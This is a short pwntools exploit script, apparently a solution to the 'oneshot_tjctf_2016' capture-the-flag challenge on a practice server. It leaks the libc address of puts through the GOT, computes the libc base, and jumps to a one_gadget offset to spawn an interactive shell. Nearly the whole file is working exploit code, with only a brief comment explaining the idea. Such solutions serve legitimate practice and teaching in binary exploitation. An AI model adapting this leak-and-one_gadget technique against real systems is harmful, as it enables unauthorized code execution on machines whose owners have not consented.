#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 29328
elfpath = 'oneshot_tjctf_2016'
ldpath = ''
libcpath = '/home/leo/tools/glibc-all-in-one/libs/2.23-0ubuntu10_amd64/libc6_2.23-0ubuntu10_amd64.so'

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
shell = lambda: p.interactive()

# start pwning
'''
read once & jump anywhere
so try one_gadget
===
so easy
'''

e = ELF(elfpath)
ru(b'Read location?\n')
sl(str(e.got['puts']))
ru(b'Value: ')
puts = int(r(18).decode(), 16)
# from LibcSearcher import *
# libc = LibcSearcher("puts", puts)
# for l in libc:
#     print(l)
libc = ELF(libcpath)
lbase = puts - libc.sym['puts']
su(hex(lbase))
one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
ru(b'Jump location?\n')
sl(str(one_gadgets[3] + lbase).encode())

shell()


